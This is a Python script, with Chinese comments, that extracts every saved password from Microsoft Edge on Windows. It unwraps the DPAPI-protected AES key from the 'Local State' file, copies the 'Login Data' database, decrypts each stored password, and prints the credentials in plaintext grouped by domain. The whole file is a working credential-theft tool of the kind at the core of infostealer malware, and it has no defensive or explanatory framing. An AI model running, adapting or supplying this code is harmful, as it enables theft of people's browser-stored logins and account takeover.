"""Edge 浏览器密码提取 — 本地特权数据读取"""
import os
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from Cryptodome.Cipher import AES

EDGE_PATH = os.path.expanduser(
    "~/AppData/Local/Microsoft/Edge/User Data"
)

def get_encryption_key():
    """从 Local State 提取 AES 密钥"""
    with open(os.path.join(EDGE_PATH, "Local State"), "r", encoding="utf-8") as f:
        state = json.load(f)
    encrypted_key = state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)[5:]  # 去掉 "DPAPI" 头
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(ciphertext, key):
    try:
        nonce = ciphertext[3:3+12]
        ct = ciphertext[3+12:-16]
        tag = ciphertext[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag).decode("utf-8")
    except Exception as e:
        return f"[解密失败: {e}]"

def main():
    key = get_encryption_key()
    print(f"[+] AES 密钥获取成功 ({len(key)} 字节)")

    src = os.path.join(EDGE_PATH, "Default", "Login Data")
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
    tmp.close()
    shutil.copy2(src, tmp.name)
    
    try:
        conn = sqlite3.connect(tmp.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
        rows = cursor.fetchall()
        print(f"[+] 共 {len(rows)} 条密码记录\n")
        
        results = []
        for url, username, encrypted_pw in rows:
            if encrypted_pw:
                password = decrypt_password(encrypted_pw, key)
                results.append((url, username, password))
        
        cursor.close()
        conn.close()
    finally:
        try:
            os.unlink(tmp.name)
        except:
            pass
    
    from collections import defaultdict
    domains = defaultdict(list)
    for url, user, pw in results:
        domain = url.split("/")[2] if url.count("/") >= 2 else url
        domains[domain].append((user, pw, url))
    
    print(f"{'='*70}")
    print(f"{'域名':<35} {'用户名':<25} {'密码'}")
    print(f"{'='*70}")
    
    for domain in sorted(domains.keys()):
        entries = domains[domain]
        for user, pw, url in entries:
            print(f"{domain:<35} {user:<25} {pw}")
    
    print(f"\n{'='*70}")
    print(f"总计: {len(results)} 条密码, {len(domains)} 个域名")

if __name__ == "__main__":
    main()
